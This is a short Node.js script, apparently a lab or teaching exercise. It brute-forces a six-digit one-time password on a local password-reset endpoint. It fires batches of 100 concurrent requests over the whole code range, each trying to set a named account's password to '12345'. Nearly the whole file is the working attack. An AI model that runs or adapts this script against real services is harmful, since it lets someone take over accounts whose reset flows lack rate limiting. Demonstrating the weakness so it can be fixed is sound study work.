const axios = require("axios");

async function sendRequest(otp: string) {
  let data = JSON.stringify({
    email: "rajdeep@gmail.com",
    otp: otp,
    newPassword: "12345",
  });

//   console.log('data', data)

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://localhost:3000/reset-password",
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };

  try {
    await axios.request(config);
  } catch (error) {
    console.log(error);
    
  }
}

async function main() {
  for (let i = 100001; i <= 999999; i += 100) {
    console.log(i);
    const reqs = [];
    for (let j = 0; j < 100; j++) {
      reqs.push(sendRequest((i + j).toString()));
    }
    await Promise.all(reqs);
  }
}

main();
